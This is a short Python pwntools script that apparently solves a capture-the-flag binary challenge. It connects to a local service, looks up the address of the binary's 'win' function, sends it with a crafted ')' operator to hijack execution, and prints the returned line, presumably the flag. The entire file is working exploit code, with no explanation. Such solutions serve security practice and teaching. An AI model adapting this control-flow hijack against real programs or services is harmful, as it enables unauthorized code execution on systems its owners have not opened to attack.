#!/bin/env python3
from pwn import *
context.log_level = 'error'
io = remote("localhost", 4002)
e = ELF("chall")

for _ in range(3):
    io.readline().decode()

addr = int(e.sym['win'])
io.sendline("10 %ld" %(addr))

op = chr(ord('*') - 1)

io.sendline(op)
io.readline()
io.readline()
print(io.readline().decode('utf-8', 'ignore'), end='')
exit(0)
